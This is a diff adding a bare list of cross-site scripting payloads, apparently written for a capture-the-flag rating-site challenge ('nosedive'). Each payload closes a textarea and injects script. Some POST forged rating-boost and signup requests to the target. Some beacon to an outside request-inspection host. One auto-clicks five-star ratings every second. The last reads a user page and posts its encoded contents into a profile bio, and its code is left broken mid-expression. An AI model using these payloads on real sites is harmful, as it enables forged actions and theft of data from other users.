@@ -1,0 +1,33 @@
+"></textarea><script>alert(1)</script><textarea id="
+"></textarea><script>fetch("https://nosedive.hackmirror.icu/u/dratini0_******/boost_rating", {method: "POST", body: "username=dratini0_******"})</script><textarea id="
+"></textarea><script>fetch("https://nosedive.hackmirror.icu/beta/boost_rating", {method: "POST", body: "username=dratini0_******"})</script><textarea id="
+"></textarea><script>fetch("https://nosedive.hackmirror.icu/beta/signup", {method: "POST", body: "username=dratini0_******"})</script><textarea id="
+"></textarea><script>fetch("https://requestinspector.com/inspect/01chv198y9z7vpy9482r26d4sm", {method: "POST", body: "username=dratini0_******"})</script><textarea id="
+"></textarea><img src="https://requestinspector.com/inspect/01chv1dpjfcjjrdwkjar7nk8an.png"><textarea id="
+"></textarea><script>fetch("/beta/signup", {method: "POST", body: "username=dratini0_******"})</script><textarea id="
+"></textarea><script>$("#star5").click(); window.setInterval(function(){$("#submit-rating").click()}, 1000)</script><textarea id="
+
+"></textarea>
+<script>
+$(function(){
+    $("#star5").click();
+    window.setInterval(function(){
+        $("#submit-rating").click()
+    }, 1000);
+})
+</script>
+<textarea id="
+
+"></textarea>
+<script>
+// I know you are listening
+$(function(){
+    fetch("https://nosedive.hackmirror.icu/u/dratini0_******").then((response) => {
+        fetch("https://nosedive.hackmirror.icu/u/dratini0_******", {
+            method: "POST",
+            body: "bio=" + encodeURIComponent(btoa(response.))
+        })
+    })
+})
+</script>
+<textarea id="
